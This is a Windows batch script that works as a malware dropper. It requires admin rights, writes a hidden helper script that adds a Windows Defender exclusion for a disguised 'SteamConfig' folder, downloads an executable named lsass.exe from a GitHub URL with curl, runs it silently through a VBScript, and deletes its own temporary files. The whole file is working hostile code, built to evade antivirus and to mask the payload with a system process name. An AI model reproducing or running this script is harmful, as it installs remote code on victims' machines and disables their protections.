@echo off
setlocal enabledelayedexpansion

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrative privileges. Please run as administrator.
    pause
    exit /b 1
)

:: Set paths dynamically
set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
set "batchScript=%TEMP%\hidden_runner.bat"
set "vbsScript=%TEMP%\hidden_runner.vbs"
set "exeFile=%folderPath%\lsass.exe"

:: Create the hidden batch script
(
    echo @echo off
    echo setlocal enabledelayedexpansion
    echo if not exist "%folderPath%" mkdir "%folderPath%"
    echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
    echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1
    echo :checkFile
    echo if not exist "%exeFile%" (timeout /t 2 /nobreak ^>nul ^& goto checkFile)
    echo for %%%%F in ("%exeFile%") do set filesize=%%%%~zF
    echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul ^& goto checkFile)
    echo start /b "%exeFile%"
    echo exit /b 0
) > "%batchScript%"

:: Create the VBScript to run the batch file silently
(
    echo Set objShell = CreateObject("WScript.Shell")
    echo objShell.Run "cmd.exe /c %batchScript%", 0, False
) > "%vbsScript%"

:: Execute the VBScript silently
cscript //nologo "%vbsScript%"

:: Clean up (optional, remove if you want to keep the temp files for debugging)
del "%batchScript%" >nul 2>&1
del "%vbsScript%" >nul 2>&1

exit /b 0
